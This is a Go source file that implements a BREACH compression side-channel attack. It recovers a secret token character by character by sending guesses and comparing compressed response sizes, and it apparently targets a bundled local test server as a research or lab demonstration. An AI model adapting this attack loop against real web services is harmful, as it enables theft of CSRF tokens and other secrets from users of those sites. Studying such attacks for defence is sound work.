package cryptopener

import (
	"log"
	"io/ioutil"
	"os"
	//"sort"
	"time"
	"math/rand"
	
	client "github.com/larikuistio/cryptopener/client"
	testserver "github.com/larikuistio/cryptopener/testserver"
)

// Cryptopener a struct that defines cryptopener
type Cryptopener struct {
	// client for sending data to target server
	client *client.Client
	// token mutator that creates new payloads
	mutator *TokenMutator
	ResultToken string
	guess_count int
	correct_count int
	base_length int
	correct_length int
}

// NewCryptopener creates new instance of Cryptopener
func NewCryptopener(address string, entry string) *Cryptopener {
	cryptopener := Cryptopener{
		client: client.NewClient(address, entry),
		mutator: NewMutator(),
	}
	return &cryptopener
}

func (p *Cryptopener) analyseResponse(response []byte) int {
	filename := "/tmp/tmpfile"
	ioutil.WriteFile(filename, response, os.FileMode(0666))
	fi, _ := os.Stat(filename)
	size := fi.Size()
	os.Remove(filename)
	log.Printf("Filesize: %d", size)

	return int(size)
}

func createPadding() string {
	dummy_chars := "!#&%$*+-"
	ret := ""
	for i := 0; i < 8; i++ {
		ret = ret + string(dummy_chars[rand.Intn(7)])
	}
	return ret
}

// Run starts BREACH attack
func (p *Cryptopener) Run() {
	rand.Seed(time.Now().Unix())
	server := testserver.NewTestServer()
	go server.Run()
	p.ResultToken = ""
	p.guess_count = 0
	p.correct_count = 0
	x := 0
	m := 1
	temp_length := 0
	var prev_payload []byte
	prev_payload = []byte("")
	dummy_chars := "!#&%$*+-"
	padding := ""
	for {
		if x == 0 {
			// create new payload
			var payload []byte
			payload = prev_payload
			for i := 0; i < m; i++ {
				payload = []byte(string(payload) + string(dummy_chars[i]))
			}
			log.Printf("Sending payload: %s", string(payload))
			time.Sleep(5 * time.Millisecond)
			// send payload into a socket and then response into channel
			response := p.client.SendMessage(string(payload), padding)
			p.base_length = p.analyseResponse(response)
			x = 1
		} else if x == 1 {
			var payload []byte
			var guesses []string
			var guess_found bool
			for true {
				// create new payload
				payload = prev_payload
				for i := 0; i < m; i++ {
					for a := 0; a < rand.Intn(((m - 1) % 2) * 64 + 1); a++ {
						_ = p.mutator.NextToken()
					}
					nextToken := p.mutator.NextToken()
					payload = []byte(string(payload) + string(nextToken))
				}
				guess_found = false
				for i := range guesses {
					if guesses[i] == string(payload[len(payload) - m:]) {
						guess_found = true
						break
					}
				}
				if !guess_found {
					guesses = append(guesses, string(payload[len(payload) - m:]))
					break
				}
			}
			
			log.Printf("Sending payload: %s", string(payload))
			time.Sleep(5 * time.Millisecond)
			// send payload into a socket and then response into channel
			response := p.client.SendMessage(string(payload), padding)
			temp_length = p.analyseResponse(response)
			p.guess_count++

			if temp_length < p.base_length {
				p.correct_length = temp_length
				p.ResultToken = string(p.ResultToken) + string(payload[len(payload) - m:])
				x = 0
				p.correct_count++
				prev_payload = payload
				m = 1
				p.guess_count = 0
				
			} else if p.guess_count > (m * m * m * m * m) * 64 {
				m++
				x = 0
				p.guess_count = 0
				if m == 4 {
					padding = padding + createPadding()
				} else if m == 2 {
					padding = padding + createPadding()
				} else if m == 9 {
					m = 0
				}
			}
		}

		if p.correct_count == 63 {
			log.Printf("The guessed token is %s", p.ResultToken)
			log.Printf("Correct token is %s", server.Token)
			break
		}
	}
}
